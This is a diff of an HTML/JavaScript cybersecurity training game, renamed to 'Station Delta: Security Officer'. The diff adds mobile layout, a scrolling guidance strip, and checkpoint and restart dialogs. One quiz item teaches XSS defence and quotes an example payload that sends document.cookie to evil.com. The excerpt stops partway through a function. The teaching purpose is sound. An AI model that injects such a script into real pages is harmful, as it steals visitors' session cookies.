@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vibe Security Officer</title>
+<title>Station Delta: Security Officer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&family=Unbounded:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
@@ -41,6 +41,9 @@
   --silver-d:#455a64;
   --silver-bg:#0a0e10;
   --silver-bright:#eceff1;
+  --accent:#ef4444;
+  --accent-deep:#7f1d1d;
+  --accent-bg:#140404;
   --mono:'JetBrains Mono',monospace;
   --display:'Unbounded',sans-serif;
   --janet:'Share Tech Mono',monospace;
@@ -56,7 +59,7 @@ body::after{content:'';pointer-events:none;position:fixed;inset:0;
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 @keyframes fadeUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
 @keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
-@keyframes pulseGlow{0%,100%{box-shadow:0 0 4px var(--silver)}50%{box-shadow:0 0 14px var(--silver),0 0 28px rgba(176,190,197,.15)}}
+@keyframes pulseGlow{0%,100%{box-shadow:0 0 4px var(--accent)}50%{box-shadow:0 0 14px var(--accent),0 0 28px rgba(239,68,68,.2)}}
 @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 @keyframes spin{to{transform:rotate(360deg)}}
@@ -68,38 +71,111 @@ body::after{content:'';pointer-events:none;position:fixed;inset:0;
 @keyframes bossGlow{0%,100%{box-shadow:0 0 8px var(--red),0 0 20px rgba(239,68,68,.15)}50%{box-shadow:0 0 20px var(--red),0 0 50px rgba(239,68,68,.3)}}
 
 /* ── LAYOUT ── */
-#shell{display:grid;grid-template-rows:48px 1fr;grid-template-columns:1fr 380px;height:100vh;gap:0;overflow:hidden}
+#shell{display:grid;grid-template-rows:48px 28px 1fr;grid-template-columns:1fr 380px;height:100vh;gap:0;overflow:hidden}
 
 /* ── TOPBAR ── */
 #topbar{grid-column:1/-1;background:var(--surface);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px;padding:0 18px}
-#logo{font-family:var(--display);font-size:11px;font-weight:900;letter-spacing:.15em;color:var(--silver);white-space:nowrap}
+#logo{font-family:var(--display);font-size:11px;font-weight:900;letter-spacing:.15em;color:var(--accent);white-space:nowrap;display:flex;flex-direction:column;line-height:1.1}
+#logo-sub{font-size:8px;font-weight:400;letter-spacing:.25em;color:var(--muted2);text-transform:uppercase}
 #cadet-tag{font-size:11px;color:var(--muted2)}
-#cadet-tag b{color:var(--silver)}
+#cadet-tag b{color:var(--accent)}
 #phase-track{flex:1;display:flex;align-items:center;justify-content:center;gap:0}
 .pdot{width:7px;height:7px;border-radius:50%;background:var(--border);border:1px solid var(--b2);transition:all .3s;cursor:default;position:relative}
 .pdot+.pdot{margin-left:3px}
-.pdot.done{background:var(--silver);border-color:var(--silver)}
-.pdot.active{background:var(--silver);border-color:var(--silver);animation:pulseGlow 2s infinite}
+.pdot.done{background:var(--accent);border-color:var(--accent)}
+.pdot.active{background:var(--accent);border-color:var(--accent);animation:pulseGlow 2s infinite}
 .pdot:hover::after{content:attr(data-tip);position:absolute;bottom:14px;left:50%;transform:translateX(-50%);background:var(--s3);border:1px solid var(--b2);color:var(--text);font-size:10px;padding:3px 7px;border-radius:var(--r4);white-space:nowrap;z-index:100;pointer-events:none}
 .phase-sep{font-size:9px;color:var(--border);margin:0 5px}
 #tb-right{display:flex;align-items:center;gap:6px}
 .tbbtn{background:var(--s2);border:1px solid var(--border);color:var(--muted2);padding:3px 10px;border-radius:var(--r4);font-family:var(--mono);font-size:10px;cursor:pointer;transition:all .15s;letter-spacing:.04em}
 .tbbtn:hover{background:var(--s3);border-color:var(--b2);color:var(--text)}
+#mobile-tools-btn{
+  display:none;align-items:center;justify-content:center;gap:6px;
+  background:var(--s2);border:1px solid var(--b2);color:var(--text);
+  padding:3px 10px;border-radius:var(--r4);font-family:var(--mono);font-size:10px;cursor:pointer;transition:all .15s;letter-spacing:.04em
+}
+#mobile-tools-btn:hover{background:var(--s3);border-color:var(--b3)}
+#mobile-strip-toggle-btn{
+  display:none;align-items:center;justify-content:center;width:30px;height:30px;
+  background:var(--accent-bg);border:1px solid var(--accent-deep);color:var(--accent);
+  border-radius:var(--r4);font-size:14px;cursor:pointer;transition:all .15s;padding:0;line-height:1;flex-shrink:0
+}
+#mobile-strip-toggle-btn:hover{background:var(--s3);border-color:var(--accent)}
+#mobile-strip-toggle-btn.strip-is-hidden{background:var(--s2);border-color:var(--b2);color:var(--muted2)}
 #sandbox-pill{background:var(--amber-bg);border:1px solid var(--amber-d);color:var(--amber);padding:2px 9px;border-radius:var(--r4);font-size:9px;letter-spacing:.1em;display:none}
 #hardmode-pill{background:var(--red-bg);border:1px solid var(--red-d);color:var(--red);padding:2px 9px;border-radius:var(--r4);font-size:9px;letter-spacing:.1em;display:none}
-#career-impact-btn{background:var(--s2);border:1px solid var(--silver-d);color:var(--silver);padding:3px 10px;border-radius:var(--r4);font-family:var(--mono);font-size:10px;cursor:pointer;transition:all .15s;display:none}
+#career-impact-btn{background:var(--s2);border:1px solid var(--accent-deep);color:var(--accent);padding:3px 10px;border-radius:var(--r4);font-family:var(--mono);font-size:10px;cursor:pointer;transition:all .15s;display:none}
+#career-impact-btn:hover{background:var(--accent-bg)}
+
+/* ── LOLA TOP STRIP ── */
+#lola-strip{
+  grid-column:1/-1;background:linear-gradient(90deg,var(--accent-bg),var(--blue-bg));
+  border-bottom:1px solid var(--accent-deep);display:flex;align-items:center;gap:0;
+  height:28px;overflow:hidden;flex-shrink:0;position:relative
+}
+#lola-strip-avatar{
+  flex-shrink:0;background:var(--accent-deep);color:var(--accent);
+  font-size:9px;font-weight:700;letter-spacing:.1em;padding:0 10px;height:100%;
+  display:flex;align-items:center;border-right:1px solid var(--accent-deep);white-space:nowrap
+}
+#lola-strip-scroll{flex:1;overflow:hidden;position:relative;height:100%;display:flex;align-items:center}
+#lola-strip-inner{display:flex;align-items:center;gap:0;white-space:nowrap;will-change:transform}
+#lola-strip-inner.scrolling{animation:lolaScroll 28s linear infinite}
+#lola-strip-inner.no-scroll{animation:none;padding-left:14px}
+@keyframes lolaScroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+#lola-strip-ctrls{display:flex;align-items:center;gap:6px;padding:0 8px;flex-shrink:0}
+.strip-btn{
+  background:var(--s2);border:1px solid var(--b2);color:var(--muted2);
+  padding:5px 9px;border-radius:4px;cursor:pointer;font-size:10px;letter-spacing:.05em;line-height:1
+}
+.strip-btn:hover{color:var(--text);border-color:var(--accent-deep)}
+.strip-btn[aria-pressed="true"]{border-color:var(--accent);color:var(--accent)}
+.lola-strip-msg{font-size:11px;color:var(--cyan);padding:0 28px 0 0;display:inline-flex;align-items:center;gap:7px;transition:opacity .4s}
+.lola-strip-msg .ls-tag{
+  font-size:9px;text-transform:uppercase;letter-spacing:.1em;
+  color:var(--accent);background:var(--accent-bg);border:1px solid var(--accent-deep);
+  padding:1px 6px;border-radius:3px
+}
+.lola-strip-msg code{background:rgba(255,255,255,.06);padding:0 5px;border-radius:3px;color:var(--amber);font-size:10px}
 
 /* ── TERMINAL ── */
-#term-panel{display:flex;flex-direction:column;background:var(--bg);border-right:1px solid var(--border)}
+#term-panel{display:flex;flex-direction:column;background:var(--bg);border-right:1px solid var(--border);min-height:0;height:100%}
 #term-titlebar{background:var(--surface);border-bottom:1px solid var(--border);padding:6px 14px;display:flex;align-items:center;gap:10px}
 .macs{display:flex;gap:5px}
 .mac{width:11px;height:11px;border-radius:50%}
 .mac.r{background:#ff5f57}.mac.y{background:#febc2e}.mac.g{background:#28c840}
 #term-path{flex:1;text-align:center;font-size:11px;color:var(--muted2)}
 #term-path span{color:var(--silver)}
-#output{flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:0;scroll-behavior:smooth}
+#output{flex:1 1 auto;min-height:0;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:0;scroll-behavior:smooth}
 #output::-webkit-scrollbar{width:3px}
 #output::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
+
+/* ── FIX COLLAPSING JIT / REAL WORLD / HINT / DIAGNOSIS BLOCKS ── */
+#output > *{
+  flex-shrink:0;
+  width:100%;
+}
+
+.jit,
+.bridge,
+.hint-wrap,
+.diag-block,
+.diag-block-progressive,
+.teach,
+.concept,
+.spaced-rep,
+.janet-arrival,
+.boss-container,
+.breakit,
+.challenge,
+.cmd-unlock,
+.manpage{
+  display:block;
+  width:100%;
+  min-width:0;
+  flex-shrink:0 !important;
+  overflow:visible;
+}
 
 .ln{font-size:13px;line-height:1.65;padding:1px 0;animation:fadeUp .12s ease;white-space:pre-wrap;word-break:break-word}
 .ln-cmd{color:var(--text)}.ln-cmd::before{content:'$ ';color:var(--silver)}
@@ -237,12 +313,18 @@ body::after{content:'';pointer-events:none;position:fixed;inset:0;
 .man-detail{background:var(--blue-bg);border:1px solid var(--blue-d);border-radius:var(--r4);padding:10px 14px;font-size:12px;color:var(--text);line-height:1.75}
 .man-detail code{color:var(--amber);background:var(--s3);padding:1px 4px;border-radius:3px}
 
-#input-row{background:var(--surface);border-top:1px solid var(--border);display:flex;align-items:center;padding:0 16px;height:46px;gap:8px}
+#input-row{background:var(--surface);border-top:1px solid var(--border);display:flex;align-items:center;padding:0 16px;height:46px;gap:8px;flex-shrink:0;margin-top:auto}
 #prompt-pre{font-size:13px;color:var(--silver);white-space:nowrap;user-select:none}
 #cmd{flex:1;background:transparent;border:none;outline:none;font-family:var(--mono);font-size:13px;color:var(--text);caret-color:var(--silver)}
 #cmd::placeholder{color:var(--muted);font-style:italic}
 
 #right{display:flex;flex-direction:column;background:var(--surface);overflow:hidden}
+#right-header{display:none;padding:8px 10px;border-bottom:1px solid var(--border);background:var(--s2);align-items:center;justify-content:flex-end;flex-shrink:0}
+#right-collapse-btn{
+  background:var(--bg);border:1px solid var(--b2);color:var(--muted2);border-radius:var(--r4);
+  padding:5px 10px;font-family:var(--mono);font-size:10px;cursor:pointer;transition:all .15s
+}
+#right-collapse-btn:hover{color:var(--text);border-color:var(--accent)}
 #obj-card{border-bottom:1px solid var(--border);padding:13px 14px;flex-shrink:0}
 #obj-phase-label{font-family:var(--display);font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted2);margin-bottom:5px}
 #obj-title{font-family:var(--display);font-size:14px;font-weight:700;color:var(--text);margin-bottom:6px;line-height:1.3}
@@ -296,6 +378,12 @@ body::after{content:'';pointer-events:none;position:fixed;inset:0;
 #telem-hd{padding:5px 12px;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);border-bottom:1px solid var(--border);background:var(--s2)}
 #telem-log{flex:1;overflow-y:auto;padding:5px 12px;font-size:10px;color:var(--muted2);line-height:1.6}
 
+#shell.right-collapsed{grid-template-columns:1fr 46px}
+#shell.right-collapsed #right > :not(#right-header){display:none}
+#shell.right-collapsed #right-header{display:flex;justify-content:center;padding:8px 4px;height:100%}
+#shell.strip-hidden{grid-template-rows:48px 0 1fr}
+#shell.strip-hidden #lola-strip{display:none}
+
 #toast{position:fixed;bottom:70px;right:18px;background:var(--s2);border:1px solid var(--silver-d);border-radius:var(--r8);padding:11px 15px;font-size:12px;color:var(--silver);z-index:9000;transform:translateX(130%);transition:transform .3s ease;max-width:260px;pointer-events:none}
 #toast.show{transform:translateX(0)}
 #toast-title{font-weight:700;margin-bottom:2px}
@@ -308,6 +396,32 @@ body::after{content:'';pointer-events:none;position:fixed;inset:0;
 .mbox::-webkit-scrollbar-thumb{background:var(--b2)}
 .mtitle{font-family:var(--display);font-size:17px;font-weight:700;color:var(--text);margin-bottom:7px}
 .msub{font-size:12px;color:var(--muted2);line-height:1.7;margin-bottom:14px}
+.boot-box{border-color:var(--accent-deep);box-shadow:0 0 0 1px rgba(239,68,68,.08),0 18px 48px rgba(0,0,0,.35)}
+.boot-title{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:4px;
+  margin-bottom:10px;
+  text-align:center;
+  color:var(--accent);
+}
+.boot-title-main{
+  font-family:var(--display);
+  font-size:20px;
+  font-weight:900;
+  letter-spacing:.16em;
+  color:var(--accent);
+}
+.boot-title-sub{
+  font-family:var(--display);
+  font-size:11px;
+  font-weight:700;
+  letter-spacing:.28em;
+  text-transform:uppercase;
+  color:var(--muted2);
+}
 .mbtn{display:block;width:100%;padding:10px;border-radius:var(--r4);font-family:var(--mono);font-size:12px;cursor:pointer;letter-spacing:.06em;transition:all .15s;margin-bottom:8px;border:none}
 .mbtn-p{background:var(--silver);color:#000;font-weight:700}
 .mbtn-p:hover{background:var(--silver-bright)}
@@ -321,6 +435,13 @@ input[type=text]:focus{border-color:var(--silver)}
 .grad-ct{font-size:10px;text-transform:uppercase;letter-spacing:.2em;color:var(--silver-d);margin-bottom:6px}
 .grad-name{font-family:var(--display);font-size:22px;font-weight:900;color:var(--silver);margin-bottom:4px}
 .grad-sub{font-size:11px;color:var(--muted2)}
+.modal-sub-title{font-size:13px;font-weight:400;letter-spacing:.3em;color:var(--muted2);margin-top:2px}
+.checkpoint-box{background:var(--s2);border:1px solid var(--blue-d);border-radius:var(--r8);padding:18px;margin:18px 0;text-align:left}
+.checkpoint-kicker{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--blue);margin-bottom:8px;font-weight:700}
+.checkpoint-title{font-family:var(--display);font-size:18px;color:var(--text);margin-bottom:8px}
+.checkpoint-copy{font-size:12px;color:var(--muted2);line-height:1.75}
+.checkpoint-next{margin-top:12px;padding-top:12px;border-top:1px solid var(--border);font-size:12px;color:var(--text);line-height:1.7}
+.checkpoint-next b{color:var(--blue)}
 .skills-list{background:var(--green-bg);border:1px solid var(--green-d);border-radius:var(--r8);padding:12px 14px;margin-bottom:14px;font-size:11px;color:var(--text);line-height:2.1}
 .skills-list span{color:var(--green);margin-right:8px}
 .ach-item{display:flex;align-items:flex-start;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)}
@@ -379,21 +500,55 @@ input[type=text]:focus{border-color:var(--silver)}
 .diag-hd-prog{font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--amber);margin-bottom:5px;font-weight:700;display:flex;gap:6px;align-items:center}
 .diag-level-badge{background:var(--amber);color:#000;font-size:8px;padding:1px 5px;border-radius:3px;font-weight:700}
 .diag-takeaway{margin-top:8px;padding:6px 10px;background:var(--surface);border-left:2px solid var(--purple);border-radius:0 var(--r4) var(--r4) 0;font-size:11px;color:var(--purple)}
+
+@media(max-width:820px){
+  #shell{grid-template-columns:1fr;grid-template-rows:48px 28px 1fr 52px}
+  #shell.strip-hidden{grid-template-rows:48px 0 1fr 52px}
+  #shell.right-collapsed{grid-template-columns:1fr;grid-template-rows:48px 28px 1fr 52px}
+  #shell.right-collapsed.strip-hidden{grid-template-rows:48px 0 1fr 52px}
+  #topbar{padding:0 10px;gap:8px}
+  #career-impact-btn{padding:3px 8px;font-size:10px}
+  #mobile-tools-btn{display:inline-flex}
+  #mobile-strip-toggle-btn{display:inline-flex}
+  #right-header{display:flex}
+  #tb-right .tbbtn{display:none}
+  #term-panel{min-height:0}
+  #output{min-height:0}
+  #right{min-height:52px;max-height:52px;border-top:1px solid var(--border)}
+  #shell:not(.right-collapsed) #right{min-height:230px;max-height:46vh}
+  #shell:not(.right-collapsed) #right > :not(#right-header){display:block}
+  #shell.right-collapsed #right-header{justify-content:center;padding:8px 10px;height:auto}
+}
 </style>
 </head>
 <body>
 <div id="shell">
   <div id="topbar">
-    <div id="logo">🔐 VIBE · SECURITY OFFICER</div>
+    <div id="logo">STATION DELTA<span id="logo-sub">SECURITY OFFICER</span></div>
     <div id="cadet-tag">Officer: <b id="cadet-name-display">—</b></div>
     <div id="phase-track"></div>
     <div id="tb-right">
       <span id="sandbox-pill">SANDBOX</span>
       <span id="hardmode-pill">HARD MODE</span>
-      <button id="career-impact-btn" class="tbbtn" onclick="openModal('career-modal');document.getElementById('career-impact-btn').style.display='none'">📈 Career Log</button>
-      <button class="tbbtn" onclick="openModal('gloss-modal')">📖 Glossary</button>
-      <button class="tbbtn" onclick="openModal('man-modal')">📋 Manual</button>
-      <button class="tbbtn" onclick="openModal('ach-modal')">🏆 Badges</button>
+      <button id="career-impact-btn" class="tbbtn" onclick="openModal('career-modal')">📈 CAREER LOG</button>
+      <button id="mobile-tools-btn" aria-label="Open mobile tools menu" onclick="openModal('mobile-tools-modal')">☰ TOOLS</button>
+      <button id="mobile-strip-toggle-btn" aria-label="Show or hide command rail" onclick="toggleRightPanel()" title="Show or hide the side rail"></button>
+      <button class="tbbtn" onclick="openModal('gloss-modal')">GLOSSARY</button>
+      <button class="tbbtn" onclick="openModal('man-modal')">MAN PAGES</button>
+      <button class="tbbtn" onclick="openModal('ach-modal')">ACHIEVEMENTS</button>
+      <button class="tbbtn" onclick="doRestart()">RESTART</button>
+    </div>
+  </div>
+
+  <div id="lola-strip">
+    <div id="lola-strip-avatar">⊗ L.O.L.A.</div>
+    <div id="lola-strip-scroll">
+      <div id="lola-strip-inner">
+        <span class="lola-strip-msg"><span class="ls-tag">threat</span> Security Officer runs on threat-red discipline. Use the objective card, type the exact command family, and treat every prompt like a live incident.</span>
+      </div>
+    </div>
+    <div id="lola-strip-ctrls">
+      <button class="strip-btn" id="strip-pause-btn" aria-pressed="false" aria-label="Pause scrolling guidance" onclick="toggleStripPause()">Pause</button>
     </div>
   </div>
 
@@ -414,6 +569,9 @@ input[type=text]:focus{border-color:var(--silver)}
   </div>
 
   <div id="right">
+    <div id="right-header">
+      <button id="right-collapse-btn" aria-pressed="false" aria-controls="right" aria-label="Collapse command and telemetry panel" onclick="toggleRightPanel()">Collapse</button>
+    </div>
     <div id="obj-card">
       <div id="obj-phase-label">Phase 1 of 9</div>
       <div id="obj-title">Loading…</div>
@@ -456,9 +614,12 @@ input[type=text]:focus{border-color:var(--silver)}
 
 <!-- BOOT -->
 <div id="boot-modal" class="modal open">
-  <div class="mbox">
-    <div style="font-size:28px;margin-bottom:8px">🔐</div>
-    <div class="mtitle" style="color:var(--silver);font-size:19px">Vibe Security Officer</div>
+  <div class="mbox boot-box">
+    <div style="font-size:28px;margin-bottom:8px;text-align:center">🔐</div>
+    <div class="mtitle boot-title">
+      <span class="boot-title-main">STATION DELTA</span>
+      <span class="boot-title-sub">SECURITY OFFICER</span>
+    </div>
     <div class="msub">The ship is live. Attackers are already scanning it. Now you're responsible for keeping it secure — from the perimeter to zero-trust. Authentication, injection attacks, secrets, DDoS, AI scanning, threat modeling, incident response, and the security program itself.</div>
     <div class="boot-features">
       <span>▸</span>9 phases · real-world security engineering<br>
@@ -492,7 +653,7 @@ input[type=text]:focus{border-color:var(--silver)}
     </div>
     <button class="mbtn mbtn-p" onclick="startAcademy()">SECURE THE SHIP</button>
     <button class="mbtn mbtn-s" onclick="doRestart()">Reset Save</button>
-    <div style="margin-top:12px;font-size:10px;color:var(--muted)">Part of the Vibe series. No account needed.</div>
+    <div style="margin-top:12px;font-size:10px;color:var(--muted)">Station Delta simulation. No account needed.</div>
   </div>
 </div>
 
@@ -501,11 +662,11 @@ input[type=text]:focus{border-color:var(--silver)}
   <div class="mbox">
     <div style="font-size:32px;text-align:center;margin-bottom:8px">🔐</div>
     <div class="mtitle" style="text-align:center;color:var(--silver)">Security Certification</div>
-    <div class="msub" style="text-align:center">You completed all 9 phases of Vibe Security Officer — including the boss fight. The ship is secure.</div>
+    <div class="msub" style="text-align:center">You completed all 9 phases of Station Delta: Security Officer — including the boss fight. The ship is secure.</div>
     <div class="grad-cert">
       <div class="grad-ct">Security Certification</div>
       <div class="grad-name" id="grad-name">—</div>
-      <div class="grad-sub">Vibe Security Officer · Class of 2026</div>
+      <div class="grad-sub">Station Delta: Security Officer · Class of 2026</div>
     </div>
     <div class="skills-list">
       <span>✓</span>Perimeter defense: auth, rate limiting, CORS, security headers<br>
@@ -526,6 +687,48 @@ input[type=text]:focus{border-color:var(--silver)}
   </div>
 </div>
 
+<div id="phase-modal" class="modal">
+  <div class="mbox">
+    <div class="mtitle" style="color:var(--blue)">Phase Checkpoint</div>
+    <div class="msub">You finished a full phase. This is a clean stopping point if you want a break.</div>
+    <div class="checkpoint-box">
+      <div class="checkpoint-kicker" id="phase-modal-kicker">Phase Complete</div>
+      <div class="checkpoint-title" id="phase-modal-title">Perimeter Defense complete</div>
+      <div class="checkpoint-copy" id="phase-modal-copy">Good place to pause. Your progress is already saved.</div>
+      <div class="checkpoint-next" id="phase-modal-next">Next up: <b>Phase 2</b></div>
+    </div>
+    <div style="text-align:center">
+      <button class="mbtn mbtn-p" onclick="continueFromCheckpoint()">START NEXT PHASE</button>
+      <button class="mbtn mbtn-s" onclick="closeModal('phase-modal')">TAKE A BREAK</button>
+    </div>
+  </div>
+</div>
+
+<div id="restart-modal" class="modal">
+  <div class="mbox">
+    <div class="mtitle" style="color:var(--red)">Restart Training?</div>
+    <div class="msub">This will clear your saved progress and reload the simulation from the beginning.</div>
+    <div style="text-align:center">
+      <button class="mbtn mbtn-p" onclick="confirmRestart()">YES, START OVER</button>
+      <button class="mbtn mbtn-s" onclick="closeModal('restart-modal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div id="mobile-tools-modal" class="modal">
+  <div class="mbox">
+    <div class="mtitle">Mobile Tools</div>
+    <div class="msub">The phone layout condenses the top bar. Open support surfaces here without leaving the sim.</div>
+    <div style="display:grid;gap:10px">
+      <button class="mbtn mbtn-p" onclick="openSupportModal('man-modal')">OPEN MAN PAGES</button>
+      <button class="mbtn mbtn-p" onclick="openSupportModal('gloss-modal')">OPEN GLOSSARY</button>
+      <button class="mbtn mbtn-p" onclick="openSupportModal('ach-modal')">OPEN ACHIEVEMENTS</button>
+      <button class="mbtn mbtn-p" onclick="restartFromMobileTools()">RESTART TRAINING</button>
+    </div>
+    <div style="margin-top:14px"><button class="mbtn mbtn-s" style="margin-left:0" onclick="closeModal('mobile-tools-modal')">Close</button></div>
+  </div>
+</div>
+
 <div id="ach-modal" class="modal"><div class="mbox"><div class="mtitle">🏆 Achievements</div><div class="msub">Security milestones earned.</div><div id="ach-list"></div><div style="margin-top:14px"><button class="mbtn mbtn-s" onclick="closeModal('ach-modal')">Close</button></div></div></div>
 <div id="gloss-modal" class="modal"><div class="mbox"><div class="mtitle">📖 Glossary</div><div class="msub">Security terms. Click any to see inline.</div><div id="gloss-list"></div><div style="margin-top:14px"><button class="mbtn mbtn-s" onclick="closeModal('gloss-modal')">Close</button></div></div></div>
 <div id="man-modal" class="modal"><div class="mbox"><div class="mtitle">📋 Manual Pages</div><div class="msub">Command reference. Also accessible by typing <code style="color:var(--amber)">man</code>.</div><div id="man-list"></div><div style="margin-top:14px"><button class="mbtn mbtn-s" onclick="closeModal('man-modal')">Close</button></div></div></div>
@@ -533,7 +736,7 @@ input[type=text]:focus{border-color:var(--silver)}
 
 <script>
 /* ═══════════════════════════════════════════════════════════════
-   VIBE SECURITY OFFICER v1.0
+   Station Delta: Security Officer v1.0
    J.A.N.E.T. administers all quizzes. GLaDOS energy.
    L.O.L.A. is your tactical intel officer.
    Boss Fight: Phase 9 — L.O.L.A. goes offline. JANET takes over.
@@ -543,6 +746,11 @@ let G = {
   name:'Officer', phase:1, step:0, tries:0, score:1000,
   hard:false, practitioner:false, expert:false, sandbox:false,
   learnerPath:'explorer',
+  pendingPhaseStart:false,
+  rightCollapsed:false,
+  stripPaused:false,
+  stripHidden:false,
+  mobilePresetApplied:false,
   agents:[], achievements:[], completedPhases:[],
   cmdHistory:[], histIdx:-1,
   currentPath:'/home/officer/ops',
@@ -737,7 +945,7 @@ const BREAKIT = [
 const CHALLENGES = [
   null,
   {title:'Design the Auth Middleware',scenario:'You\'re adding authentication to a new API. The current code passes user data directly from the request to the database. Design an auth middleware that validates JWTs, extracts the user ID, and attaches it to the request context. What are the three things it must verify?',acceptFn:v=>v.includes('jwt')||v.includes('verify')||v.includes('token')||v.includes('signature')||v.includes('expir')||v.includes('middleware'),answer:'JWT middleware must: (1) verify the signature against the secret/public key, (2) check the expiration claim (exp), (3) validate the issuer and audience claims. Attaching only the user ID (not the full token) to req.user prevents token data from leaking into business logic.'},
-  {title:'Fix the XSS Vulnerability',scenario:'A comments section renders user input directly:\n\ndiv.innerHTML = userComment;\n\nAn attacker posts: <script>fetch("https://evil.com/steal?c="+document.cookie)</script>\n\nThis executes for every visitor. Name two defenses you would implement.',acceptFn:v=>v.includes('encode')||v.includes('sanitiz')||v.includes('csp')||v.includes('text')||v.includes('escape'),answer:'(1) Use textContent instead of innerHTML to prevent script execution. (2) Implement a Content Security Policy header that blocks inline scripts. DOMPurify is also acceptable for cases where HTML must be rendered. Never use innerHTML with user content.'},
+  {title:'Fix the XSS Vulnerability',scenario:'A comments section renders user input directly:\n\ndiv.innerHTML = userComment;\n\nAn attacker posts: <script>fetch("https://evil.com/steal?c="+document.cookie)<\\/script>\n\nThis executes for every visitor. Name two defenses you would implement.',acceptFn:v=>v.includes('encode')||v.includes('sanitiz')||v.includes('csp')||v.includes('text')||v.includes('escape'),answer:'(1) Use textContent instead of innerHTML to prevent script execution. (2) Implement a Content Security Policy header that blocks inline scripts. DOMPurify is also acceptable for cases where HTML must be rendered. Never use innerHTML with user content.'},
   {title:'OAuth State Parameter',scenario:'A developer implements OAuth login but skips the state parameter because "it\'s optional." Three weeks later, users report being logged into each other\'s accounts.\n\nExplain the attack that is occurring and what the state parameter prevents.',acceptFn:v=>v.includes('csrf')||v.includes('state')||v.includes('forgery')||v.includes('cross-site'),answer:'This is a CSRF (Cross-Site Request Forgery) attack on the OAuth flow. An attacker initiates OAuth, intercepts the callback, and tricks a victim into completing the attacker\'s auth flow — logging the victim into the attacker\'s account. The state parameter (a random nonce) prevents this by binding the callback to the session that initiated it.'},
   {title:'Secrets in Environment Variables',scenario:'A team is moving secrets from hardcoded values to environment variables. They store all secrets in a .env file and commit it to the repository with a .gitignore entry.\n\nName two remaining risks and how to address them.',acceptFn:v=>v.includes('.gitignore')||v.includes('history')||v.includes('vault')||v.includes('secret manager')||v.includes('already'),answer:'Risk 1: If the .env was ever committed before the .gitignore was added, it exists in git history. Run git log --all -- .env to check, then purge history if needed. Risk 2: .gitignore only prevents future commits — it does not encrypt or protect the file at rest. For production, use a secrets manager (Vault, AWS Secrets Manager) instead of .env files.'},
   {title:'Distributed Rate Limiting',scenario:'Your API has per-IP rate limiting on each server instance. You have 10 server instances. An attacker hitting any single server is limited to 100 req/min, but across 10 servers they can send 1,000 req/min.\n\nHow do you fix this?',acceptFn:v=>v.includes('redis')||v.includes('central')||v.includes('shared')||v.includes('distribut')||v.includes('sync'),answer:'Centralized rate limiting using a shared store (Redis). Each server checks a shared counter in Redis rather than maintaining local state. This ensures that 100 req/min is enforced across all instances, not per-instance. Redis atomic operations (INCR + TTL) make this safe under concurrent load.'},
@@ -1118,6 +1326,7 @@ const BOSS_STEPS = [
 const $out = document.getElementById('output');
 const $cmd = document.getElementById('cmd');
 const $tl  = document.getElementById('telem-log');
+let _stripRotateInterval=null;
 
 /* ── UTILS ── */
 function norm(v){return v.toLowerCase().trim()}
@@ -1134,10 +1343,84 @@ function telem(msg){
   $tl.appendChild(d);$tl.scrollTop=$tl.scrollHeight;
 }
 function delay(ms){return new Promise(r=>setTimeout(r,ms))}
+function restoreTerminalFocus(){setTimeout(()=>{$cmd?.focus()},40)}
+function applyUIPreferences(){
+  const shell=document.getElementById('shell');
+  shell.classList.toggle('right-collapsed',!!G.rightCollapsed);
+  shell.classList.toggle('strip-hidden',!!G.stripHidden);
+  const collapseBtn=document.getElementById('right-collapse-btn');
+  if(collapseBtn){
+    collapseBtn.textContent=G.rightCollapsed?'Expand':'Collapse';
+    collapseBtn.setAttribute('aria-pressed',String(!!G.rightCollapsed));
+  }
+  const mobileToggle=document.getElementById('mobile-strip-toggle-btn');
+  if(mobileToggle){
+    mobileToggle.textContent=G.rightCollapsed?'☰':'×';
+    mobileToggle.classList.toggle('strip-is-hidden',!!G.rightCollapsed);
+  }
+  const pauseBtn=document.getElementById('strip-pause-btn');
+  if(pauseBtn){
+    pauseBtn.textContent=G.stripPaused?'Resume':'Pause';
+    pauseBtn.setAttribute('aria-pressed',String(!!G.stripPaused));
+  }
+}
+function toggleRightPanel(){
+  G.rightCollapsed=!G.rightCollapsed;
+  applyUIPreferences();
+  save();
+}
+function toggleStripPause(){
+  G.stripPaused=!G.stripPaused;
+  const inner=document.getElementById('lola-strip-inner');
+  if(inner){
+    inner.classList.toggle('scrolling',!G.stripPaused && !inner.classList.contains('no-scroll'));
+    inner.style.animationPlayState=G.stripPaused?'paused':'running';
+  }
+  applyUIPreferences();
+  save();
+}
+function openSupportModal(id){
+  closeModal('mobile-tools-modal');
+  openModal(id);
+}
+function restartFromMobileTools(){
+  closeModal('mobile-tools-modal');
+  doRestart();
+}
+function continueFromCheckpoint(){
+  closeModal('phase-modal');
+  G.pendingPhaseStart=false;
+  save();
+  startPhase();
+}
+function openPhaseCheckpoint(completedPhase,nextPhase){
+  const completedIndex=PHASES.findIndex(p=>p===completedPhase);
+  document.getElementById('phase-modal-kicker').textContent=`Phase ${completedIndex} complete`;
+  document.getElementById('phase-modal-title').textContent=`${completedPhase.title} complete`;
